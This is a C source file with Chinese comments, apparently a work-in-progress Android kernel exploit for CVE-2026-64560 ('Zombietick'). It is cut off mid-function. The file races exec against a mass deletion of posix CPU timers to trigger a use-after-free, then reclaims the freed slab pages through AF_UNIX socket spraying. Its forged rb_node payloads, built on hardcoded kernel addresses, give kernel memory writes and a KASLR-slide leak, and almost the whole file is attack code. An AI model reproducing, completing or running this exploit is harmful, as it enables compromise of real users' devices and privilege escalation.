/* stage0 v3 —— CVE-2026-64560 (Zombietick) 移植：证明 UAF 回收 + 取得 KASLR slide
 *
 * v3 相对 v2 的两处结构性修正（v2 零命中的根因）：
 *   1) **exec 必须与删除风暴重叠**。进程级 CPU 定时器的 it.cpu.pid 是 PIDTYPE_TGID
 *      （clock_pid_type() 返回 PIDTYPE_TGID），而 de_thread() 会把 TGID pid 移交给
 *      exec 的那个线程。所以"exec 完成后再删"时 pid_task() 解析到活着的 exec 线程、
 *      sighand 有效、disarm_timer 正常摘除 —— 结构上不可能留下悬空节点。
 *      唯一窗口是 release_task(old_leader) 内部 __exit_signal()（sighand=NULL）到
 *      detach_pid(PIDTYPE_TGID) 之间。
 *   2) **删除后必须等 k_itimer 真正归还 slab 再 spray**。release_posix_timer() 走
 *      call_rcu(&tmr->rcu, k_itimer_rcu_free)；实测删完那一刻 active 一个都不降
 *      （21297 -> 21297），要 RCU 宽限期过后才释放，页才还给 buddy。
 *      故编排为：风暴 → 强制执行 RCU → 等 posix_timers_cache 排空 → 才填充 → 才 kill。
 *
 * 判据无需 root：cat /proc/sys/kernel/random/boot_id（mode 0444，shell 可读）。
 *   detect 模式：纯 0x41 填充。内核在 timerqueue_del 之后会写 ctmr->head = NULL
 *                （freed + 0x98），故 recv 回来的流里出现连续 8 个零字节
 *                = "悬空节点存在 + 我们成功回收"的唯一证明（不依赖伪造指针正确）。
 *   stage0 模式：伪造 rb_node 走两次确定写 ——
 *                mem[forged_parent+8] = forged_child（改 random_table[4].data）
 *                mem[forged_child +0] = forged_parent（写进泄漏源首 qword）⇒ 读回得 slide。
 *
 * 用法：stage0 [stage0|detect|baseline|list|affinity]，参数全走 env（见 main 的 env_* 段）。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CPUCLOCK_SCHED 2
#define SELF_PATH "/proc/self/exe"
#define ACK_PATH "/data/local/tmp/s0_ack"      /* exec 之后由 sh 写：证 de_thread 已完成 */
#define MARK_PATH "/data/local/tmp/s0_execpt"  /* execv 之前由 victim 写：证已到达 exec 点 */

/* ---- 本内核事实（5.15.197 / PD2338_A_16.2.13.2）---- */
#define LINK_CYCLE_ADDR   0xffffffc00adadd28ULL  /* blacklisted_initcalls：自指 list_head */
#define LINK_BOOTID_FIELD 0xffffffc00af27160ULL  /* random_table[4].data 字段地址 */
#define LINEAR(x)         ((x) - 0x0000003f60000000ULL)  /* 镜像映射 -> 线性映射别名 */
#define FORGED_PARENT     LINEAR(LINK_BOOTID_FIELD - 8)
#define FORGED_CHILD      LINEAR(LINK_CYCLE_ADDR)

/* fake k_itimer 布局 */
#define SLOT_STRIDE     0x108
#define SLOT_IT_CPU_OFF 0x78
#define NODE_RIGHT_OFF  0x08

/* ---- 参数 ---- */
static int KS = 20000;                  /* 每轮创建的定时器数 */
static int WORKERS = 5;                 /* 删除线程数 */
static int EXEC_AFTER = 100;            /* 上游 exec_after_deleted = 100（注意与
                                         * prime_start_deleted=32 是两个独立旋钮，
                                         * 我此前把前者错设成 32） */
static int EXEC_REPEATS = 3;           /* 上游 race_exec_repeats（panther 3~12） */
/* SEND_BYTES = 8KB，**按 order-1 对齐**（上游 ORDER1_SIZE = 0x2000 同理）。
 *
 * 依据（本轮实测 + 源码）：/proc/slabinfo 显示 posix_timers_cache = objsize 264 /
 * 31 obj / **2 页 = order-1(8KB)**；AF_UNIX 发送的载荷走**页片段（order-0 page frag）**，
 * 不进任何 kmalloc cache（实测 slabinfo 前后无变化）。所以回收是在**页级**发生的：
 * buddy 在 free_area[0] 空时会把刚释放的 order-1 块**劈成两个 order-0 页**给我们。
 * 一条 8KB send 正好连续填满一个 8KB 块（0..4096 进第一页、4096..8192 进第二页），
 * 于是块内内容 == payload[0..8192]，晶格相位恒为 0 —— 这才是回收能"对齐"的关键。
 * 旧值 15840 = 3.87 页，一个块会被消息里任意一对相邻页填充，相位只有 1/4 概率对得上。
 * 8KB 不是 264 的整数倍 ⇒ 判据已同步改为与相位无关（见 scan_head_zeroed）。 */
static int SOCKS = 1024, MSGS = 8, SEND_BYTES = 8192;   /* 1024×8×8192B = 64MB 填充 */
static int RCU_TIMERS = 0;              /* 0 = 不用 force_rcu（它往同一个 posix_timers_cache
                                         * 塞 20000 个对象再释放，稀释我们的回收命中）
                                         * 排空交给 wait_drain 的相对判据轮询 */
static int RCU_WAIT_MS = 30;
static int DRAIN_MS = 6000;             /* 等 slab 排空的期限 */
static int DRAIN_SLACK = 256;           /* 排空判据的松弛量（对象数；slab 31 对象/页组） */
static int ATTEMPTS = 64;
static int VERBOSE = 0;
static int IRQ_FDS = 0;   /* 旧路径：只 arm 不 read ⇒ 无 waiter ⇒ 空转，停用 */
static int POKE = 1;      /* 新路径：每删除核一个 timerfd + 阻塞 reader（真 wakeup） */
static long POKE_SPIN_NS = 0;  /* reader 醒来后的自旋时长（拉长抢占持续时间） */
static long IRQ_PERIOD_NS = 50000;
/* 开闸时刻相对 IRQ 开炮时刻的提前量（上游语义：IRQ 在开闸后 irq_after_release 开炮）。
 * 上游 = 20000 + (seq-1)%32 * 20000 即 20~640µs —— 必须与 exec 的 de_thread 重叠！
 * （曾用 20ms 默认值 ⇒ IRQ 风暴在窗口过去很久才开炮，等于没有扰动。） */
/* 上游 irq_arm_lead_ns = 250ms，但他们的 arm 点在**轮次开头**（早于 create 58699 个
 * 定时器 ~150ms），故列车在风暴期间已在跑。我们的 arm 点已在**风暴开始前一刻**，
 * 所以等价设置是 lead=0（immediate + 50µs interval ⇒ 列车覆盖整个风暴与 exec 窗口）。 */
static long IRQ_LEAD_NS = 0;
static long IRQ_LEAD_SWEEP_NS = 0;     /* 上游不扫动：常驻 interval 风暴 */
static int IRQ_LEAD_STEPS = 0;
static long JITTER_NS = 0;              /* 固定抖动；0 = 按轮号算 */
static int PRE_DRAIN = 1;               /* 每轮先释放自己的页，让 timer 页成为"最近释放" */

static uint64_t base_q0 = 0, base_q1 = 0;
static char base_raw[64] = { 0 };

static int exec_cpu = -1, parent_cpu = 0;
static int del_cpus[16];
static int n_del_cpus = 0;

static long long nsec(void)
{
	struct timespec t;

	clock_gettime(CLOCK_MONOTONIC, &t);
	return t.tv_sec * 1000000000LL + t.tv_nsec;
}

static inline void cpu_relax(void)
{
	__asm__ volatile("yield");
}

static int pin_fails;
static int pin(int cpu)
{
	cpu_set_t s;

	if (cpu < 0)
		return 0;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof s, &s)) {
		pin_fails++;
		return -1;
	}
	return 0;
}

/* ---------------- /proc/slabinfo ---------------- */
static int slab_read(const char *name, long *act, long *tot)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char line[512];
	size_t nl = strlen(name);
	int r = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof line, f)) {
		if (strncmp(line, name, nl) == 0 && line[nl] == ' ') {
			long o, ops, pps;

			if (sscanf(line, "%*s %ld %ld %ld %ld %ld", act, tot, &o, &ops, &pps) == 5)
				r = 0;
			break;
		}
	}
	fclose(f);
	return r;
}

/* ---------------- 定时器 ---------------- */
static int tcreate(clockid_t c, int *id)
{
	struct sigevent e;

	memset(&e, 0, sizeof e);
	e.sigev_notify = SIGEV_SIGNAL;
	e.sigev_signo = SIGUSR1;
	return (int)syscall(SYS_timer_create, c, &e, id);
}

static int tarm(int id)
{
	struct itimerspec s;

	memset(&s, 0, sizeof s);
	s.it_value.tv_sec = 3600;
	return (int)syscall(SYS_timer_settime, id, 0, &s, NULL);
}

/* 强制执行 RCU 回调：造 R 个 MONOTONIC 定时器再全删，逼宽限期推进 */
static int force_rcu(int r)
{
	int *ids = calloc((size_t)r, sizeof(int));
	int n = 0, i;

	if (!ids)
		return 0;
	for (; n < r; n++)
		if (tcreate(CLOCK_MONOTONIC, &ids[n]))
			break;
	for (i = 0; i < n; i++)
		syscall(SYS_timer_delete, ids[i]);
	free(ids);
	return n;
}

/* ---------------- victim ---------------- */
struct shm {
	atomic_int victim_ready, victim_cpu, delete_go, deleted, delete_errors;
	atomic_int exec_after, stop;
	atomic_llong jitter_ns, exec_ns, threshold_ns;
};

static void *victim_exec_thread(void *p)
{
	struct shm *sh = p;
	int thr;
	long long j, t0;

	pin(exec_cpu);
	atomic_store(&sh->victim_cpu, exec_cpu);
	atomic_store(&sh->victim_ready, 1);

	while (!atomic_load(&sh->delete_go))
		cpu_relax();

	/* 等风暴推进到阈值再 execve —— 使 de_thread 的 release_task 窗口落在风暴中途 */
	thr = atomic_load(&sh->exec_after);
	while (atomic_load(&sh->deleted) < thr) {
		if (atomic_load(&sh->stop))
			break;
		cpu_relax();
	}
	atomic_store(&sh->threshold_ns, nsec());
	j = atomic_load(&sh->jitter_ns);
	t0 = nsec();
	while (nsec() - t0 < j)
		cpu_relax();

	atomic_store(&sh->exec_ns, nsec());
	unlink(ACK_PATH);
	unlink(MARK_PATH);
	{
		int fd = open(MARK_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);

		if (fd >= 0) {
			ssize_t w = write(fd, "x", 1);

			(void)w;
			close(fd);
		}
	}
	if (EXEC_REPEATS > 0) {
		/* 链式：本次 exec 是第 1 个 de_thread 窗口，之后 vexec 镜像再造 N-1 个 */
		char rep[16], ec[16];

		snprintf(rep, sizeof rep, "%d", EXEC_REPEATS - 1);
		snprintf(ec, sizeof ec, "%d", exec_cpu);
		setenv("S0_REP", rep, 1);
		setenv("S0_ECPU", ec, 1);
		{
			char *const argv[] = { (char *)SELF_PATH, (char *)"vexec", 0 };

			execv(argv[0], argv);
		}
	} else {
		/* ack 由 exec 之后的 sh 写 ⇒ ack 出现即证明 de_thread 已经跑完 */
		char *const argv[] = { (char *)"/system/bin/sh", (char *)"-c",
				       (char *)"echo ok > " ACK_PATH "; exec sleep 300", 0 };

		execv(argv[0], argv);
	}
	_exit(101);
}

/* ---------------- exec 链（上游 race_exec_repeats）----------------
 * victim 的**非 leader 线程**连续 exec N 次：每次 exec 都产生一个 de_thread
 * 窗口（release_task(old_leader) → sighand=NULL）。上游 panther 用 3~12 次，
 * 硬约束是"整批 exec 必须落在删除风暴窗口内"（run_race 要求所有 exec ack
 * 早于 delete_done_ns）。
 * 实现：本二进制用 /proc/self/exe 自我 re-exec，argv[1]="vexec"、S0_REP 递减；
 * 链尾写 ACK 并存活（供父进程计时）。 */
static void *chain_exec_thread(void *p)
{
	char rep[16];
	int n = getenv("S0_REP") ? atoi(getenv("S0_REP")) : 0;

	(void)p;
	snprintf(rep, sizeof rep, "%d", n - 1);
	setenv("S0_REP", rep, 1);
	{
		char *const argv[] = { (char *)SELF_PATH, (char *)"vexec", 0 };

		execv(argv[0], argv);
	}
	_exit(107);
}

static void vexec_main(void)
{
	int rep = getenv("S0_REP") ? atoi(getenv("S0_REP")) : 0;
	int cpu = getenv("S0_ECPU") ? atoi(getenv("S0_ECPU")) : -1;
	pthread_t th;

	pin(cpu);
	if (rep > 0) {
		/* 本轮镜像的 leader 造一个非 leader 线程去 exec ⇒ 再开一个 de_thread 窗口 */
		if (!pthread_create(&th, 0, chain_exec_thread, 0))
			for (;;)
				pause();
	}
	{
		int fd = open(ACK_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);

		if (fd >= 0) {
			ssize_t w = write(fd, "ok", 2);

			(void)w;
			close(fd);
		}
	}
	for (;;)
		pause();
}

static void victim_process(struct shm *sh)
{
	pthread_t th;

	pin(exec_cpu);
	if (pthread_create(&th, 0, victim_exec_thread, sh))
		_exit(104);
	for (;;)
		pause();
}

/* ---------------- IRQ 抢占：真·wakeup 风暴 ----------------
 * 上游注释（zt_race.c 头）:"Preempt the vulnerable side with a timer interrupt at
 * the moment it holds the stale pointer, which lengthens the window from
 * instructions to a scheduling quantum."
 *
 * 关键链条：timerfd 到期 → hrtimer 回调 → wake_up_poll。**只有存在等待者**，
 * 才会唤醒一个任务；刚睡醒的任务 vruntime 落后，CFS 据此抢占当前正在跑的删除
 * 线程 —— 这才把窗口从"几条指令"拉长到"一个调度时间片"。
 * 只 settime 而无人 read/poll ⇒ wake_up 找不到 waiter ⇒ 完全空转
 * （我们此前整条 IRQ 路径正是如此，等于没有抢占）。
 * hrtimer 在**调用者所在 CPU** 上排队，所以 settime 要绑到目标核。 */
struct pokestate {
	int fd;
	int cpu;
	long spin_ns;
	atomic_int *stop;
	atomic_int *ready;
};

static void *poker_thread(void *p)
{
	struct pokestate *ps = p;
	uint64_t exp;

	pin(ps->cpu);
	atomic_fetch_add(ps->ready, 1);
	for (;;) {
		ssize_t n = read(ps->fd, &exp, sizeof exp);

		if (n != 8)
			break;
		if (ps->spin_ns > 0) {
			long long t = nsec() + ps->spin_ns;

			while (nsec() < t)
				cpu_relax();
		}
		if (atomic_load(ps->stop))
			break;
	}
	return 0;
}

/* ---------------- 删除风暴 ---------------- */
struct dstate {
	struct shm *sh;
	int *ids;
	int n;
	int wcount;
	atomic_int serial, ready;
	int irq[16];
	int irq_n;
	atomic_int irq_arm_go, irq_armed;
	atomic_llong irq_target_ns;
};

static void *deleter(void *p)
{
	struct dstate *d = p;
	int w = atomic_fetch_add(&d->serial, 1);
	int i;

	pin(del_cpus[w % n_del_cpus]);
	if (w == 0) {
		d->irq_n = 0;
		for (i = 0; i < IRQ_FDS && i < 16; i++) {
			int fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);

			if (fd < 0)
				break;
			d->irq[d->irq_n++] = fd;
		}
	}
	atomic_fetch_add(&d->ready, 1);

	if (w == 0) {
		while (!atomic_load(&d->irq_arm_go))
			cpu_relax();
		if (d->irq_n) {
			struct itimerspec it;
			long long t = atomic_load(&d->irq_target_ns);

			memset(&it, 0, sizeof it);
			it.it_value.tv_sec = t / 1000000000LL;
			it.it_value.tv_nsec = t % 1000000000LL;
			it.it_interval.tv_sec = IRQ_PERIOD_NS / 1000000000L;
			it.it_interval.tv_nsec = IRQ_PERIOD_NS % 1000000000L;
			for (i = 0; i < d->irq_n; i++)
				timerfd_settime(d->irq[i], TFD_TIMER_ABSTIME, &it, NULL);
		}
		atomic_store(&d->irq_armed, 1);
	}

	while (!atomic_load(&d->sh->delete_go))
		cpu_relax();

	/* 跨线程跨步扫全部定时器（与上游 delete_worker 同构） */
	for (i = w; i < d->n; i += d->wcount) {
		if (atomic_load(&d->sh->stop))
			break;
		if (syscall(SYS_timer_delete, d->ids[d->n - 1 - i]))
			atomic_fetch_add(&d->sh->delete_errors, 1);
		else
			atomic_fetch_add(&d->sh->deleted, 1);
	}
	return 0;
}

/* ---------------- 回收（socket 发送队列）---------------- */
static int *socks = 0;

static int spray_setup(void)
{
	int i;

	socks = calloc((size_t)SOCKS * 2, sizeof(int));
	if (!socks)
		return -1;
	for (i = 0; i < SOCKS; i++) {
		int sz = 8 << 20;

		if (socketpair(AF_UNIX, SOCK_STREAM, 0, &socks[i * 2]))
			return -1;
		setsockopt(socks[i * 2], SOL_SOCKET, SO_SNDBUF, &sz, sizeof sz);
	}
	return 0;
}

static void spray_close(void)
{
	int i;

	if (!socks)
		return;
	for (i = 0; i < SOCKS * 2; i++)
		if (socks[i] > 0)
			close(socks[i]);
	free(socks);
	socks = 0;
}

static long spray_fill(const unsigned char *frag)
{
	long sent = 0;
	int i, m;

	for (i = 0; i < SOCKS; i++)
		for (m = 0; m < MSGS; m++)
			if (send(socks[i * 2], frag, (size_t)SEND_BYTES, MSG_DONTWAIT) == SEND_BYTES)
				sent++;
	return sent;
}

static void spray_drain(void)
{
	static char sink[64 * 1024];
	int i;

	for (i = 0; i < SOCKS; i++)
		while (recv(socks[i * 2 + 1], sink, sizeof sink, MSG_DONTWAIT) > 0)
			;
}

/* detect：内核在 timerqueue_del 之后写 ctmr->head = NULL，位置固定在
 *   页内偏移 ≡ 0x98 (mod 0x108)（slab 页与我们的块对齐时）
 *   或         ≡ 0xA0 (mod 0x108)（slab 页落在一个 order-2 块的第二半时，整体错 8 字节）
 * 我们的填充在 [0x78,0x98) 是零、其余 0x41 ⇒ 这两个位置上**只有内核能写零**，
 * 所以"该位置出现零 qword"就是"UAF 命中 + 回收成功"的无歧义证明。 */
static long g_hit_ptr, g_hit_zero, g_run_hits;

/* 命中判据（**相位无关**，按 8 字节步进扫全流）。
 *
 * 之前按固定相位（0x98 / 0xA0 mod 0x108）扫描，隐含假设"消息边界不改变相位" ——
 * 那个假设只在 SEND_BYTES 是 0x108 整数倍时才成立。而 reclaim 的正确性来自
 * **分配阶数**：posix_timers_cache 的 slab 是 order-1(8KB)，所以发送尺寸必须
 * 取 8KB，好让**一条消息正好连续填满一个 order-1 块**（否则一个块会被消息里
 * 任意一对相邻页填充，内容相位只有 1/4 概率对得上）。8KB 不是 264 的整数倍，
 * 所以相位会随消息漂移 ⇒ 判据必须改成与相位无关。
 *
 * 命中时内核对我们填充的这块内存有两次可辨识写：
 *   A) cleanup_timerqueue 的 `ctmr->head = NULL`
 *      ⇒ 槽位出现 [expires=0xffff…][head=0] 相邻；我们自己的载荷是 [ff*8][41*8]。
 *      （8KB 消息内 0x108 晶格最高 ff 位置是 0x1F80，+8 仍在消息内 ⇒ 边界不会伪造出该模式）
 *   B) timerqueue_del 尾部的 RB_CLEAR_NODE(&node->node)
 *      ⇒ 槽位 +0x78 变成节点自身内核地址（高 16 位 0xffff，且不是全 1）。
 */
static long scan_head_zeroed(void)
{
	static unsigned char sink[64 * 1024];
	long hits = 0;
	int i;

	for (i = 0; i < SOCKS; i++) {
		int sock_hit = 0;

		for (;;) {
			ssize_t n = recv(socks[i * 2 + 1], sink, sizeof sink, MSG_DONTWAIT);
			ssize_t k;

			if (n <= 0)
				break;
			if (sock_hit)
				continue;
			for (k = 0; k + 16 <= n; k += 8) {
				uint64_t q0, q1;

				memcpy(&q0, sink + k, 8);
				memcpy(&q1, sink + k + 8, 8);
				if (q0 == ~0ULL && q1 == 0) {
					sock_hit = 1;
					g_hit_zero++;
					break;
				}
			}
			for (k = 0; k + 8 <= n && !sock_hit; k += 8) {
				uint64_t q;

				memcpy(&q, sink + k, 8);
				if ((q >> 48) == 0xffffULL && q != ~0ULL) {
					sock_hit = 1;
					g_hit_ptr++;
					break;
				}
			}
			if (sock_hit) {
				hits++;
				break;
			}
		}
	}
	return hits;
}

/* ---------------- fake fragment ---------------- */
/* **安全探针片段**：0x41 填充，但把每个槽位的 rb_node 三个指针 + expires 全置 0。
 *
 * 为什么安全（推导自 rbtree 的 Case 1 路径）：伪造节点 parent=NULL、left=NULL、right=NULL ⇒
 *   cleanup_timerqueue() → timerqueue_del() → rb_erase_cached():
 *     · rb_next(node): rb_right==0 → 父链 rb_parent==NULL → 立即结束 ⇒ rb_leftmost = NULL
 *     · rb_erase(node): tmp=left=0 ⇒ Case 1 ⇒ __rb_change_child(node, child=0, parent=NULL, root)
 *       ⇒ 写 root->rb_node = NULL（parent 为 NULL 才会走这里，这正是我们需要的）
 *     · child==0 ⇒ 不执行 child->__rb_parent_color 那一半；rebalance = RED ⇒ NULL
 *   ⇒ 队列被正确清空、循环终止，**不会再有"把伪造地址当节点走链"的 Case 2 陷阱**
 *     （此前把 forged_parent 指向内核地址的版本会在命中后走 Case 2 → oops）。
 * 为什么可观测：紧接着 e 的 timerqueue_del 之后，cleanup_timerqueue 会写
 *   ctmr->head = NULL（= freed_k_itimer + 0x98 = node + 0x20）到我们这页里。
 *   而这一页除了节点字段外全是 0x41 ⇒ recv 回来的流里出现 ≥8 个连续零字节 = 命中。
 * 关键优势：**完全不需要任何内核地址**（不依赖物理基址/KASLR slide）。 */
#define HEAD_OFF_IN_SLOT 0x98   /* ctmr->head = freed_k_itimer + 0x98 = node + 0x20 */
static void build_fragment_safe(unsigned char *buf, size_t len)
{
	size_t base;

	memset(buf, 0x41, len);
	/* 每个槽位（k_itimer，0x108）按 struct cpu_timer 的真实布局填：
	 *   node+0x00 rb_parent_color / node+0x08 rb_right / node+0x10 rb_left = 0
	 *     ⇒ cleanup_timerqueue→timerqueue_del→rb_erase_cached：
	 *        rb_next(node) 因 rb_right=0 且 parent=0 返回 NULL ⇒ rb_leftmost=NULL
	 *        rb_erase 走 Case 1、parent=NULL ⇒ root->rb_node=NULL；rebalance=NULL
	 *        ⇒ 循环干净终止、无 rebalance
	 *   node+0x18 expires = UINT64_MAX（★ 上次重启的根因修在这里）
	 *     ⇒ collect_timerqueue() 的 `now < expires` 立即 return，tick 路径
	 *        不再触碰 firing/handling/elist/head，也就不会走到
	 *        cpu_timer_dequeue() 里 `if (ctmr->head) timerqueue_del(ctmr->head,…)`
	 *        而解引用我们填的 0x41...（那正是 02:58 那次 oops→RCU stall→panic 的路径）
	 *   node+0x20 head 保持 0x41（非零）—— cleanup_timerqueue 会写 NULL 进来，
	 *     这就是观测点；因 expires 远期，tick 路径碰不到 head，所以非零是安全的。
	 *   node+0x28 pid = 0  ⇒ posix_cpu_timer_del 的 put_pid()/pid_task() 都安全返回
	 *   node+0x30/0x38 elist、0x40 firing、0x48 handling = 0
	 *     ⇒ handling=0 让 posix_cpu_timer_wait_running() 不再解引用垃圾指针 */
	for (base = 0; base + SLOT_IT_CPU_OFF + 0x50 <= len; base += SLOT_STRIDE) {
		unsigned char *nd = buf + base + SLOT_IT_CPU_OFF;

		memset(nd, 0, 0x18);                              /* rb 三指针 */
		*(uint64_t *)(void *)(nd + 0x18) = UINT64_MAX;    /* expires 远期 */
		/* nd+0x20 head：留 0x41（观测点） */
		memset(nd + 0x28, 0, 0x28);                       /* pid/elist/firing/handling */
	}
}
static void build_fragment(unsigned char *buf, size_t len)
{
	size_t base;

	memset(buf, 0, len);
	for (base = 0; base + SLOT_IT_CPU_OFF + 0x18 <= len; base += SLOT_STRIDE) {
		uint64_t *node = (uint64_t *)(void *)(buf + base + SLOT_IT_CPU_OFF);

		node[0] = FORGED_PARENT;
		*(uint64_t *)(void *)((unsigned char *)node + NODE_RIGHT_OFF) = FORGED_CHILD;
		*(uint64_t *)(void *)((unsigned char *)node + 0x10) = 0;
	}
}

/* probe 模式：rb_right = 0、rb_left = 0 ⇒ __rb_change_child() 把 NULL 写进
 * forged_parent+8（= random_table[4].data）。而 proc_do_uuid() 在 table->data == NULL
 * 时**每次读都生成新 UUID**（drivers/char/random.c:1460）—— 所以"boot_id 变成每次都不同"
 * 就是"伪造 unlink 真的执行了"的无副作用、无歧义证明。
 * 关键：child == NULL 时 `child->__rb_parent_color = pc` 这一半不执行，
 * 所以**不需要任何有效的 forged_child**，也就不需要挑 .data 落点。 */
static void build_fragment_probe(unsigned char *buf, size_t len)
{
	size_t base;

	memset(buf, 0, len);
	for (base = 0; base + SLOT_IT_CPU_OFF + 0x18 <= len; base += SLOT_STRIDE) {
		uint64_t *node = (uint64_t *)(void *)(buf + base + SLOT_IT_CPU_OFF);

		node[0] = FORGED_PARENT;   /* __rb_parent_color = 线性别名，不随 KASLR 滑动 */
		*(uint64_t *)(void *)((unsigned char *)node + NODE_RIGHT_OFF) = 0;  /* rb_right = NULL */
		*(uint64_t *)(void *)((unsigned char *)node + 0x10) = 0;            /* rb_left  = NULL */
	}
}

/* ---------------- boot_id 读回 ---------------- */
static int hexval(char c)
{
	if (c >= '0' && c <= '9')
		return c - '0';
	if (c >= 'a' && c <= 'f')
		return c - 'a' + 10;
	return -1;
}

static int read_bootid(uint64_t *q0, uint64_t *q1, char *raw, size_t rawlen)
{
	int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
	char buf[160];
	ssize_t n, i;
	unsigned char b[16];
	int k = 0;

	if (fd < 0) {
		if (raw)
			snprintf(raw, rawlen, "<open errno=%d>", errno);
		return -1;
	}
	n = read(fd, buf, sizeof buf - 1);
	close(fd);
	if (n <= 0) {
		if (raw)
			snprintf(raw, rawlen, "<read n=%zd errno=%d>", n, errno);
		return -1;
	}
	buf[n] = 0;
	if (raw && rawlen) {
		strncpy(raw, buf, rawlen - 1);
		raw[rawlen - 1] = 0;
	}
	for (i = 0; i < n && k < 32; i++) {
		int v = hexval(buf[i]);

		if (v < 0)
			continue;
		if (k & 1)
			b[k / 2] = (unsigned char)((b[k / 2] << 4) | v);
		else
			b[k / 2] = (unsigned char)v;
		k++;
	}
	if (k < 32)
		return -1;
	memcpy(q0, b, 8);
	memcpy(q1, b + 8, 8);
	return 0;
}

/* ---------------- CPU 选核 ---------------- */
static void choose_cpus(void)
{
	cpu_set_t m, one, back;
	int avail[64], k = 0, i;

	CPU_ZERO(&m);
	if (sched_getaffinity(0, sizeof m, &m))
		return;
	/* ★ 必须逐核实测：sched_getaffinity 返回的是 cgroup cpuset 掩码，
	 * 其中可能含 sched_setaffinity 会 EINVAL 的核（实测 Neo9 上 6/7 如此，
	 * 导致 exec_cpu=6 却静默失败，victim 落在随机核上 → 窗口时序全乱）。 */
	for (i = 0; i < 64 && k < 64; i++) {
		CPU_ZERO(&one);
		CPU_SET(i, &one);
		if (sched_setaffinity(0, sizeof one, &one))
			continue;
		CPU_ZERO(&back);
		if (sched_getaffinity(0, sizeof back, &back) || !CPU_ISSET(i, &back))
			continue;
		avail[k++] = i;
	}
	sched_setaffinity(0, sizeof m, &m);   /* 还原原掩码 */
	if (!k)
		return;
	if (exec_cpu < 0)
		exec_cpu = avail[k - 1];   /* 最高可用核做 exec（Neo9 的 prime7 被 cpuset 挡住） */
	if (!n_del_cpus) {
		for (i = 0; i < k && n_del_cpus < 16; i++)
			if (avail[i] != exec_cpu && avail[i] != 0)
				del_cpus[n_del_cpus++] = avail[i];
		if (!n_del_cpus)
			del_cpus[n_del_cpus++] = exec_cpu;
	}
	parent_cpu = (avail[0] != exec_cpu) ? avail[0] : exec_cpu;
	printf("cpus(实测可用): ");
	for (i = 0; i < k; i++)
		printf("%d ", avail[i]);
	printf("| exec=%d parent=%d del=", exec_cpu, parent_cpu);
	for (i = 0; i < n_del_cpus; i++)
		printf("%d ", del_cpus[i]);
	printf("\n");
}

/* ---------------- 排空闸门 ---------------- */
static long g_drain_ms = -1;
static int wait_drain(long base_total, long alloc_total, int seq)
{
	long long deadline = nsec() + (long long)DRAIN_MS * 1000000LL;
	long a = -1, t = -1;
	long need = alloc_total - base_total;          /* 本轮新增的对象数 */
	long rel_gate = alloc_total - (need - need / 10);  /* 已释放 >= 90% 即视为排空 */

	for (;;) {
		if (!slab_read("posix_timers_cache", &a, &t)) {
			if (t <= base_total + DRAIN_SLACK || t <= rel_gate) {
				g_drain_ms = (nsec() - (deadline - (long long)DRAIN_MS * 1000000LL)) / 1000000;
				return 0;
			}
		}
		if (nsec() >= deadline)
			break;
		usleep(5000);
	}
	printf("DRAIN_FAIL attempt=%d active=%ld total=%ld base=%ld alloc=%ld gate=%ld\n",
	       seq, a, t, base_total, alloc_total, rel_gate);
	return -1;
}

/* ---------------- 一轮 ---------------- */
static int round_do(int seq, const unsigned char *frag, int detect, int probe)
{
	int hit = 0;
	struct shm *sh;
	pid_t v;
	int *ids = 0;
	struct dstate d;
	pthread_t th[64];
	int n = 0, i, deleted, ack, mark;
	long base_a = -1, base_t = -1, a1 = -1, t1 = -1;
	long sent = 0;
	long long t_go = 0, t_end = 0, exec_at_us = -1, storm_us = 0;
	long long ack_ns = 0, exec_batch_us = -1;
	long long tt0 = nsec(), tt1 = 0, tt2 = 0, tt3 = 0, tt4 = 0, tt5 = 0, tt6 = 0;
	clockid_t clk;

	slab_read("posix_timers_cache", &base_a, &base_t);
	if (PRE_DRAIN)
		spray_drain();

	sh = mmap(0, sizeof *sh, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	atomic_store(&sh->victim_ready, 0);
	atomic_store(&sh->delete_go, 0);
	atomic_store(&sh->deleted, 0);
	atomic_store(&sh->delete_errors, 0);
	atomic_store(&sh->stop, 0);
	atomic_store(&sh->exec_after, EXEC_AFTER);
	atomic_store(&sh->exec_ns, 0);
	atomic_store(&sh->threshold_ns, 0);
	atomic_store(&sh->jitter_ns, JITTER_NS ? JITTER_NS : (long long)((seq * 7919LL) % 10000));

	v = fork();
	if (v < 0) {
		munmap(sh, sizeof *sh);
		return 0;
	}
	if (v == 0)
		victim_process(sh);
	while (!atomic_load(&sh->victim_ready))
		cpu_relax();

	pin(parent_cpu);
	clk = (clockid_t)(((~(unsigned)v) << 3) | CPUCLOCK_SCHED);
	ids = calloc((size_t)KS, sizeof(int));
	for (; n < KS; n++) {
		if (tcreate(clk, &ids[n]))
			break;
		if (tarm(ids[n])) {
			syscall(SYS_timer_delete, ids[n]);
			break;
		}
	}
	slab_read("posix_timers_cache", &a1, &t1);
	tt1 = nsec();
	if (VERBOSE)
		printf("  attempt=%d created=%d slab_after_create=%ld/%ld\n", seq, n, a1, t1);
	if (n <= 0) {
		kill(v, SIGKILL);
		waitpid(v, 0, 0);
		munmap(sh, sizeof *sh);
		free(ids);
		return 0;
	}

	memset(&d, 0, sizeof d);
	d.sh = sh;
	d.ids = ids;
	d.n = n;
	d.wcount = WORKERS;
	atomic_store(&d.serial, 0);
	atomic_store(&d.ready, 0);
	atomic_store(&d.irq_arm_go, 0);
	atomic_store(&d.irq_armed, 0);
	for (i = 0; i < WORKERS; i++)
		if (pthread_create(&th[i], 0, deleter, &d))
			th[i] = 0;
	while (atomic_load(&d.ready) != WORKERS)
		cpu_relax();

	{
